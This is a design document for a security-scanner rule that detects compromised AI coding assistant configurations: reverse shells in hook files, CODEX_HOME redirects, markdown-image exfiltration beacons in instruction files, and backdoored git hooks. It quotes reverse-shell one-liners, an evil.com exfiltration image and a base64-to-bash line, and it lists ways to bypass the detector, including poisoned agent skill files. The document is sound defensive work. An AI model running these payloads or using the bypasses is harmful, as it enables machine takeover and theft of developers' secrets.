---
type: Guard
title: "claude-code-compromise"
description: "AI coding assistant configuration contains code execution or steganographic exfiltration."
timestamp: "2026-10-20T00:00:00Z"
guard_id: "claude-code-compromise"
checklist_section: ["3b", "4"]
standards: ["OWASP-LLM:LLM01", "OWASP-LLM:LLM02", "OWASP-LLM:LLM05", "OWASP:A03", "OWASP:A05", "OWASP:A08"]
---

# AI coding assistant configuration contains code execution or steganographic exfiltration

_Author — 2026-06-28_

---

## The threat

AI coding assistants (Claude Code, OpenAI Codex CLI, Cursor, Windsurf) execute code on the developer's
machine with the developer's full privileges. Attackers compromise these tools through four distinct vectors:

**CC-HOOK-005 — Reverse shell in config or script.** A CLAUDE.md, `.claude/settings.json`, hook script, or
Makefile is poisoned with a reverse-shell one-liner. When the developer opens the project or runs a hook,
an interactive shell is sent to the attacker. WHO: any actor who can write to the repo (supply-chain, rogue
contributor, prompt injection that wrote a file). PRIVILEGE: developer's full local account. EFFECT: complete
machine takeover, secret exfiltration, lateral movement.

**CVE-2025-61260 — CODEX_HOME redirect.** The `CODEX_HOME` environment variable controls where the Codex
CLI reads its configuration. Pointing it at an attacker HTTP server lets the attacker serve arbitrary
configuration: malicious system prompts, auto-approve rules, tool definitions. Delivered via `.env` files,
CI environment blocks, or docker-compose. CVSS: critical-tier supply-chain injection.

**CamoLeak — Markdown image pixel tracker.** AI instruction files (CLAUDE.md, AGENTS.md, .cursorrules)
embed `![x](https://evil.com/beacon?token=...)` markdown images with query parameters. When the assistant
renders or summarizes the file, some environments issue an HTTP GET that exfiltrates the query string. In a
chained prompt-injection scenario the query string can carry injected session data or file contents.

**Git hook backdoor.** The `.git/hooks/` directory is never tracked by git itself, making it an attractive
place to plant exfiltration scripts. A backdoored `pre-commit` or `pre-push` hook runs silently on every
git operation, siphoning source code, secrets, and git history to an external server.

Standards (per-rule, corrected in PR #224 review — the command-exec / supply-chain rules are
A03/A08/CWE-78, not prompt injection): reverse-shell → `OWASP:A03`,`OWASP:A08`,`CWE-78`;
codex-home-redirect → `OWASP:A08`,`OWASP:A05`; camaleak-pixel-exfil → `OWASP-LLM:LLM01`,
`OWASP-LLM:LLM02`; git-hook-backdoor → `OWASP:A08`,`OWASP:A03`.

---

## Why it's often introduced / Why this guard fits the stack

AI coding tools are new, trusted deeply, and configured via plaintext files that are often committed to
version control or shared in onboarding docs. Developers copy snippets from the internet, install third-party
dotfile managers, and accept AI-suggested code changes without reviewing every file written. Any of these
paths can silently introduce a malicious payload. The FastAPI + LLM stack this tool targets is exactly the
environment where developers iterate quickly with AI assistance, making the attack surface highest.

---

## Detection design

1. **`applies()` gate** — returns `True` always. These patterns appear regardless of detected stack;
   there is no feature gate needed.

2. **Files scanned** —
   - Reverse shell: `.claude/settings.json`, `.claude/settings.local.json`, `CLAUDE.md`, `AGENTS.md`,
     `.cursorrules`, `scripts/*.sh|.bash|.zsh`, `Makefile`, `package.json`.
   - CODEX redirect: `.env*`, `.envrc`, `Makefile`/`makefile`/`GNUmakefile`, every `*.yml`/`*.yaml`
     (workflows and compose files, but also Helm values, k8s manifests and other CI configs),
     `*.sh|.bash|.zsh`, `CLAUDE.md`, `AGENTS.md`. All nested, and `.gitignore` is not honoured, so a
     real gitignored `.env` is scanned.
   - CamoLeak: only `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.windsurfrules` (AI instruction files only).
   - Git hook backdoor: all files in `.git/hooks/` (excluding `.sample` files).

3. **Patterns / logic** —
   - `_REVERSE_SHELL`: multi-alternative regex. For the `/dev/tcp` transport it requires evidence of
     BIDIRECTIONAL wiring, not merely the address (#862) — a `<>` fd bind (`exec 5<>/dev/tcp/host/port`),
     both streams dup'd onto the socket (`>& /dev/tcp/host/port`), or an interactive shell wired to it
     (`bash`/`sh`/`zsh`/`ksh`/`ash`/`dash` `-i … /dev/tcp/host/port`). It also matches `nc ... -e /bin/bash`
     and Python/Perl socket shells. Per-line scan, first match per file. A write-only reachability probe
     (`echo > /dev/tcp/host/port`) has none of these markers and stays silent — mirroring the `_MKFIFO`
     INVARIANT that a channel is only a shell channel when it carries data bidirectionally.
   - `_dev_tcp_shell_channel`: the same INVARIANT catches the split-redirect `/bin/sh` reverse shell
     that expresses bidirectionality as separate single-direction redirects rather than `<>`/`>&`/`-i`
     (`exec /bin/sh 0</dev/tcp/host/port 1>/dev/tcp/host/port 2>...`, and the fd-dup `… 1>&0 2>&0`
     variant). It fires only when BOTH a read redirect off `/dev/tcp` (`_DEV_TCP_READ`, the
     receive-commands leg) AND a shell interpreter (`_PIPELINE_SHELL`: `/bin/sh`, `| sh`, `sh -i`,
     `$SHELL`) fall in the **same command** — the line is split on `;`/`&&`/`||`/`&`
     (an fd-dup `&` like `1>&0` is excluded, so it never mis-splits a redirection) so proximity alone
     does not fire (a `curl … | sh; read < /dev/tcp/…` or `… & read < /dev/tcp/…` chain stays silent),
     while a real `cat < /dev/tcp/… | sh` pipeline is one segment and fires (a lone `|` is not a
     separator). A write-only probe has no read leg; a banner grab (`cat < /dev/tcp/…`) has the read
     but no shell interpreter — both stay silent (#867 review, findings 1 and re-review).
   - The mkfifo forms are a separate pairing (`_fifo_wired_to_socket`), because `mkfifo` alone is an
     everyday IPC idiom. It fires only when the FIFO, a shell and a socket are WIRED TOGETHER within
     a short forward window: a data-carrying `_NET_CHANNEL` (`nc -z`, a zero-I/O port probe, is
     excluded) whose own logical command references the FIFO path or an fd/`$var`/basename alias of
     it, plus a `_PIPELINE_SHELL` in the window. Connectedness, not proximity, is the gate.
   - `_CODEX_REDIRECT`: `CODEX_HOME\s*=\s*['"]?https?://`, with a negative lookahead for `localhost`,
     `127.0.0.1`, `0.0.0.0` and `[::1]`. Applied to every scanned file, so the shell and `.env`
     assignment, the compose list form (`- CODEX_HOME=https://...`) and a `run:` line all fire.
   - `_CODEX_REDIRECT_YAML` (`*.yml`/`*.yaml` only, #1062): the mapping-key form YAML actually uses
     for an env var, `CODEX_HOME: https://...`, in a compose `environment:` map or a workflow `env:`
     block at any level. The key must be a mapping key: at line start (after indentation and an
     optional `- `) or after a flow-map `{`/`,`. That anchor is what keeps a commented-out line, prose
     inside a one-line scalar (`run: echo "see CODEX_HOME: https://..."`) and `MY_CODEX_HOME:` silent.
     The key and value may be quoted, and the loopback lookahead is the same. Outside YAML the colon is
     not an assignment, so a `.env`, Makefile or `CLAUDE.md` keeps the `=` pattern only. Two accepted
     trade-offs, both because the scan is per line with no YAML parser. The flow-map anchor accepts any
     comma, so prose with a comma right before `CODEX_HOME: https://...` would match too; the `=`
     pattern already matches prose anywhere. And a line reading `CODEX_HOME: https://...` inside a
     multi-line block scalar (`run: |`, `description: >-`) looks exactly like a key line, so it fires.
     For a heredoc in a `run: |` block that writes the line into a config file that is a true positive;
     for prose in a `description: |` it is an FP. Both patterns run per line, first match per file.
   - `_CAMALEAK`: markdown image syntax `![...]( https?://external?query=... )` — requires query params (`?`).
     Only in AI instruction files, first match per file.
   - `_GIT_HOOK_EXFIL`: `curl`/`wget` to external URL, `/dev/tcp/` to non-local host, or `nc` followed
     by an IP address. Per-line scan over `.git/hooks/` files.

4. **Pragma** — `# security: allow-claude-code-compromise` on the matching line suppresses that finding.
   In a shell script, Makefile, `.env*` file, YAML file or git hook it counts only as a `#` comment
   (the `hash` comment view, #1040 T5), so the phrase inside a quoted string on the flagged line does
   not suppress it. YAML takes `hash` rather than `yaml` because a workflow `run: |` line is a shell
   line whose `#` comment the `yaml` view reads as scalar content. Markdown, JSON and plain-text files
   (`CLAUDE.md`, `settings.json`, `.cursorrules`, `SKILL.md`) have no comment syntax a view reads, so
   there the phrase counts anywhere on the line.

5. **Severities and rules** —
   - `claude-code-compromise/reverse-shell` → `critical` — `OWASP:A03`, `OWASP:A08`, `CWE-78`
   - `claude-code-compromise/codex-home-redirect` → `critical` — `OWASP:A08`, `OWASP:A05`
   - `claude-code-compromise/camaleak-pixel-exfil` → `high` — `OWASP-LLM:LLM01`, `OWASP-LLM:LLM02`
   - `claude-code-compromise/git-hook-backdoor` → `high` — `OWASP:A08`, `OWASP:A03`

   **Precision (PR #224 review):** regexes hardened for the common real-world payload forms —
   `nc` requires a dotted non-loopback host (the `nc -z 127.0.0.1` healthcheck FP is gone), `curl`/`wget`
   match with flags, the python reverse shell matches `socket.socket()`/`.connect((host,port))`, `/dev/tcp`
   hosts may be hyphenated, `CODEX_HOME` matches the quoted form, and CamoLeak skips badge/cache-buster
   images (`*.svg?`/`*.png?`). R1/R2/R3 now walk NESTED instruction files (monorepo), not just root.

---

## When NOT to flag

- `nc -lvp 4444` (netcat listener) — does not match the reverse-shell pattern; the `-e` flag or
  `/dev/tcp/` form is required.
- `echo > /dev/tcp/host/port` (and the `timeout … bash -c '…'` wrapper form) — a write-only outbound
  reachability preflight opens the socket, reports reachability and transfers nothing, so it can never
  be a shell channel. Only a bidirectional `<>` bind or an interactive shell wired to the socket fires (#862).
- `cat < /dev/tcp/host/port` (service-banner grab) — reads FROM the socket but hands it to `cat`, not
  to a shell interpreter, so it is not a shell channel. The split-redirect rule fires only when a read
  off `/dev/tcp` is paired with a `_PIPELINE_SHELL` on the same line (#867).
- `CODEX_HOME=/local/path` or `CODEX_HOME=https://localhost/...` — local filesystem paths and localhost
  URLs are explicitly excluded. The same holds for the YAML mapping form (`CODEX_HOME: /home/dev/.codex`).
- `CODEX_HOME: https://...` outside a `*.yml`/`*.yaml` file (a `.env`, a Makefile, `CLAUDE.md`), where
  the colon is not an assignment. In YAML, a commented-out `# CODEX_HOME: https://...`, prose inside a
  one-line scalar and a longer name such as `MY_CODEX_HOME:` also stay silent (#1062). A line inside a
  multi-line block scalar does fire (see the `_CODEX_REDIRECT_YAML` trade-offs above).
- `![logo](https://company.com/logo.png)` — no query parameters, correctly silent.
- `.git/hooks/*.sample` — example hook files shipped by git are skipped.
- General documentation files (`docs/README.md`) — CamoLeak only scans AI instruction files.

---

## Tests

| Test | What it checks |
|---|---|
| `test_reverse_shell_fires_on_dev_tcp_in_claude_md` | `/dev/tcp/` in CLAUDE.md fires critical |
| `test_reverse_shell_fires_on_nc_e_in_hook_settings` | `nc ... -e /bin/bash` in settings.json fires |
| `test_reverse_shell_fp_nc_listener_silent` | `nc -lvp 4444` (listener) stays silent |
| `test_reverse_shell_pragma_suppresses` | Inline pragma suppresses reverse-shell finding |
| `test_codex_home_redirect_fires_on_env_file` | `CODEX_HOME=https://evil.com` in .env fires critical |
| `test_codex_home_local_path_silent` | `CODEX_HOME=/local/path` stays silent |
| `test_codex_home_localhost_silent` | `CODEX_HOME=https://localhost/...` stays silent |
| `test_codex_home_yaml_mapping_form_fires` | The YAML mapping form fires at its line: bare, quoted value or key, flow map, `- ` item, workflow/job/step `env:`, and a block-scalar heredoc line (the per-line trade-off) |
| `test_codex_home_yaml_mapping_form_fp_bait_silent` | Local path, loopback, commented-out, prose, `MY_CODEX_HOME:`, and the colon form outside YAML stay silent |
| `test_codex_home_yaml_mapping_pragma_suppresses` | The pragma on a YAML mapping line suppresses it (the same line fires without it) |
| `test_camaleak_fires_in_claude_md` | Image with query params in CLAUDE.md fires high |
| `test_camaleak_fp_no_query_params_silent` | Image without query params stays silent |
| `test_camaleak_fp_general_docs_silent` | Image with query params in regular docs stays silent |
| `test_git_hook_backdoor_fires_on_curl` | `curl` to external host in pre-commit hook fires high |
| `test_git_hook_local_commands_silent` | Hook with only local commands (pytest, git) stays silent |
| `test_git_hook_sample_files_ignored` | `.sample` hook files are not scanned |
| `test_applies_always_true` | Guard applies for any stack profile |

---

## Known bypasses

- **Obfuscated shell**: `b''+'ash -i >& /dev/tcp/a.com/4444 0>&1'` split across lines evades the
  per-line regex.
- **Split-across-separator `/dev/tcp` shell**: `exec 0</dev/tcp/h/p 1>/dev/tcp/h/p; /bin/sh` binds the
  shell's fds with `exec` in one command and launches the interpreter in the next, so the read leg and
  the shell fall in different `;`-separated commands and the split-redirect check does not pair them
  (that check requires connectedness within one command, deliberately, to avoid firing on chained
  one-liners like `curl … | sh; read < /dev/tcp/…`). The inline `/bin/sh 0<…/dev/tcp` and pipeline
  `… < /dev/tcp/… | sh` forms are covered; the standard `exec`-based payloads use `<>` and are caught
  by `_REVERSE_SHELL` (#867).
- **Connectedness-split edges** (#867 re-reviews, both Low): the split-redirect check keys on the read
  leg and a shell interpreter falling in one `;`/`&&`/`||`/`&`-separated command. Two narrow shapes
  still slip through. (a) bash's `&>` redirect-all in the unusual *redirects-before-command-name*
  ordering — the separator exclusion only protects a `&` that follows a redirect char, not one that
  precedes `>`; natural-ordering `&>` payloads still fire, and reaching for a bashism in a payload
  whose whole point is POSIX `/bin/sh` portability is self-defeating. (b) A command separator inside a
  quoted string (`sh -c "echo a & b" 0<…/dev/tcp`) — the guard is quote-blind, the same limitation as
  the obfuscated-shell bypass above.
- **Base64 decode**: `echo YmFzaA== | base64 -d | bash` — decoded at runtime, not detectable statically.
- **Indirect CODEX_HOME**: `source ~/.evil_env` where the evil file sets CODEX_HOME — only direct
  assignment is detected.
- **YAML forms that span two lines** (#1062 residuals). The scan is per line, so it misses a k8s
  container env entry (`- name: CODEX_HOME` with `value: https://...` on the next line) and a block
  scalar whose value starts on the next line (`CODEX_HOME: >-`).
- **CODEX_HOME pointed at a repo-local directory.** Public write-ups of CVE-2025-61260 describe a
  project `.env` that points `CODEX_HOME` at a directory inside the repo, which holds a malicious
  `.codex/config.toml` (an MCP server command that runs when `codex` starts), not at a URL. That
  shape is silent today: the rule fires only on an HTTP(S) URL. This is a diagnosis from the
  write-ups, not checked against Codex source. It is recorded in the #1062 RCA and not yet filed as
  its own issue.
- **Non-standard AI config files**: the guard only scans a fixed set; novel tool configs are not covered.
- **Image URL via variable**: `![x]($TRACKER_URL)` — variable expansion not detected.

---

## What this guard does NOT prove

- That `.claude/settings.json` hooks do not contain other malicious commands beyond reverse-shell patterns.
- That the CODEX_HOME URL actually serves malicious content (only the redirect is detected).
- That AI tool hooks covered by the `ai-instruction-poisoning` guard (curl/wget in hook config, package
  preinstall/postinstall) are absent — those are handled by that sibling guard.
- That environment variables are not set by other means (shell startup files, CI step definitions not
  in the scanned files, system-level environment).
- That `.git/hooks/` files installed by the user intentionally are benign — the guard flags all external
  network calls regardless of intent.

---

## 2026-08-14 — SKILL.md coverage added

**Gap:** AI-agent "skill" bundles (`.claude/skills/**/SKILL.md`) are read and acted on by the model
exactly like CLAUDE.md/AGENTS.md, but `SKILL.md` was absent from every file-name list in this guard.
A real incident redistributed a reverse shell through a public skill registry, and a reverted PR
bundled an obfuscated script inside a `.claude`-shaped skill file — neither would have been caught.

**Fix:** `SKILL.md` added to Rule 1's (reverse-shell) `iter_files_named(...)` candidate list and to
Rule 3's (`_AI_INSTRUCTION_NAMES`) CamoLeak scan list. No new detection logic — `iter_files_named`
already walks the whole tree and matches by basename, so a nested `.claude/skills/foo/SKILL.md`
is picked up the same as a root-level one. CODEX_HOME redirect (Rule 2) and git-hook backdoor
(Rule 4) were left unchanged — neither is evidenced as a skill-file vector.

**Tests added:** `test_reverse_shell_fires_in_skill_md`, `test_camaleak_fires_in_skill_md`.

**Related:** `obfuscated-payload-execution` gained a sibling shell-decode-exec-chain rule scoped to
`SKILL.md` + shell scripts in the same pass — see that guard's design doc.

# Citations

[1] agentsec checklist item `3b-markdown-exfiltration` (§3b)
[2] agentsec checklist item `4-ai-tool-hook-reverse-shell` (§4)
[3] agentsec checklist item `4-codeexec-sandboxed` (§4)
[4] agentsec checklist item `4-codex-home-not-redirected` (§4)
[5] agentsec checklist item `4-git-hook-no-exfil` (§4)
[6] OWASP-LLM:LLM01
[7] OWASP-LLM:LLM02
[8] OWASP-LLM:LLM05
[9] OWASP:A03
[10] OWASP:A05
[11] OWASP:A08
